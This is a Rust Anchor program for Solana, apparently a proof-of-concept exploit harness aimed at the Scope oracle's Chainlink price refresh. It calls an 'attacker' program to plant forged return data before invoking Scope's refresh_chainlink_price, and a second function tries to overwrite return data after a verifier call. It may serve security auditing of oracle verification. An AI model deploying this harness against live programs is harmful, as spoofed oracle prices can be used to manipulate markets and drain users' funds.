use anchor_lang::prelude::*;
use solana_program::program::{get_return_data, invoke};

declare_id!("Harnes1111111111111111111111111111111111111");

#[program]
pub mod harness {
    use super::*;

    pub fn call_scope_after_attacker(ctx: Context<Ctx>, attacker_data: Vec<u8>, token: u16, report: Vec<u8>) -> Result<()> {
        // 1) Call attacker to set RD
        let attacker_ix = Instruction {
            program_id: crate::rd_setter::ID,
            accounts: vec![],
            data: attacker_data.clone(),
        };
        invoke(&attacker_ix, &[])?;

        // 2) Invoke Scope's refresh_chainlink_price CPI
        scope::refresh_chainlink_price(
            Context::new(
                ctx.program_id,
                scope::RefreshChainlinkPrice {
                    user: ctx.accounts.user.clone(),
                    oracle_prices: ctx.accounts.oracle_prices.clone(),
                    oracle_mappings: ctx.accounts.oracle_mappings.clone(),
                    oracle_twaps: ctx.accounts.oracle_twaps.clone(),
                    instruction_sysvar_account_info: ctx.accounts.instruction_sysvar_account_info.clone(),
                    verifier_account: ctx.accounts.verifier_account.clone(),
                    access_controller: ctx.accounts.access_controller.clone(),
                    config_account: ctx.accounts.config_account.clone(),
                    verifier_program_id: ctx.accounts.verifier_program_id.clone(),
                },
                ctx.remaining_accounts.to_vec(),
            ),
            token,
            report,
        )
    }

    pub fn overwrite_after_verifier(ctx: Context<Ctx>, overwrite_data: Vec<u8>) -> Result<()> {
        // Try to set RD after supposed verifier CPI
        solana_program::program::set_return_data(&overwrite_data);
        // Expose what get_return_data sees (for logs)
        if let Some((pid, data)) = get_return_data() {
            msg!("last rd pid: {} len: {}", pid, data.len());
        }
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Ctx<'info> {
    pub user: Signer<'info>,
    #[account(mut)]
    pub oracle_prices: AccountLoader<'info, scope::OraclePrices>,
    /// CHECK: owner checked in scope
    pub oracle_mappings: AccountLoader<'info, scope::OracleMappings>,
    #[account(mut)]
    pub oracle_twaps: AccountLoader<'info, scope::OracleTwaps>,
    /// CHECK: Sysvar
    pub instruction_sysvar_account_info: AccountInfo<'info>,
    /// CHECK: expected fixed accounts from scope
    pub verifier_account: AccountInfo<'info>,
    /// CHECK: expected fixed accounts from scope
    pub access_controller: AccountInfo<'info>,
    /// CHECK: expected fixed accounts from scope
    pub config_account: UncheckedAccount<'info>,
    /// CHECK: expected fixed accounts from scope
    pub verifier_program_id: AccountInfo<'info>,
}

